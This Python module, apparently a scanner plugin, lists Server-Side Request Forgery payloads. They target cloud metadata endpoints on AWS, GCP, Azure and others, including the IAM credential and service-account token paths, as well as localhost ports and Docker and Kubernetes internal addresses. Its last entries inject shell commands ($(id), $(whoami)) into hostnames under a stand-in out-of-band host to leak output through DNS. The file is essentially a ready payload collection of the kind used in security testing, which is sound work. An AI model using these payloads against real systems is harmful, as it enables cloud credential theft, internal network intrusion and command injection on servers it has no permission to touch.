"""SSRF payloads — cloud metadata, internal services, OOB callbacks."""

NAME = "Server-Side Request Forgery"
DESCRIPTION = "SSRF probes for cloud metadata, internal services, and OOB detection"
RISK = "MEDIUM"

PAYLOADS = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json",
    # Alibaba/OVH metadata
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1.json",
    # Internal services
    "http://localhost/",
    "http://localhost:80/",
    "http://localhost:443/",
    "http://localhost:22/",
    "http://localhost:3306/",
    "http://localhost:6379/",
    "http://localhost:8080/",
    "http://localhost:9200/",
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://0.0.0.0/",
    # Internal Docker/K8s
    "http://172.17.0.1/",
    "http://172.17.0.2/",
    "http://172.16.0.1/",
    "http://10.0.0.1/",
    "http://10.0.0.2/",
    # Kubernetes internal
    "http://kubernetes.default.svc/",
    "http://kubernetes.default.svc.cluster.local/",
    # OOB detection
    "http://oob.example.com/ssrf-test",
    "https://oob.example.com/ssrf-test",
    # DNS-based OOB
    "http://ssrf-$(id).oob.example.com/",
    "http://ssrf-$(whoami).oob.example.com/",
]
